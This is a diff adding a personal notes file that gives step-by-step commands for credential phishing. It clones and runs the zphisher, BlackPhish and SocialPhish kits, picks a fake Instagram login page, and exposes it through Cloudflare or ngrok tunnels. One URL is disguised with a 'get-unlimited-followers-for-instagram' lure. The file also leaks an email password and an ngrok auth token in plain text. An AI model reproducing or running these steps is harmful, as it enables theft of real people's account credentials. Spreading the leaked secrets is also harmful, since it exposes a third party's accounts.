@@ -1,0 +1,48 @@
+Successfully phishing attack by 
+-----------------------zphisher----------------------------------------
+
+git clone git://github.com/htr-tech/zphisher.git
+cd zphisher
+bash zphisher.sh
+select option -2 for instagram
+select option -1 for tradition login page
+select option -3 Cloudflared 
+wait few minutes after create link 
+URL 2 : http://get-unlimited-followers-for-instagram@supplement-tier-reception-modification.trycloudflare.com
+
+
+-------------------------BlackPhish----------------------------------------------
+
+git clone https://github.com/iinc0gnit0/BlackPhish
+cd BlackPhish
+./install.sh
+sudo python3 blackphish.py
+
+open webbrowser tpye :- http://127.0.0.1
+
+----------------------------SocialPhish-----------------------------------------
+social phishing attack
+git clone https://github.com/xHak9x/SocialPhish.git
+cd SocialPhish
+chmod +x socialphish.sh
+./socialphish.sh
+
+
+
+---------------------
+first register on nagrok your email id after send authontication key in your inbox
+id-sachinsirohi47@gmail.com
+pwd-sachin@12345
+1) curl -L https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -o ngrok.zip
+2)unzip ngrok.zip
+chmod +x ngrok
+
+or  (this directly copy and paste link for downloading)
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz
+
+./ngrok authtoken <myauthtoken>
+./ngrok authtoken 23iuvG23ZRGhzQFMfpo4VzWnq5T_2e1pcsvFbCrL9HhUNTsMn
+
+if you want to deleter forefully
+rm -rf blackeye 
+
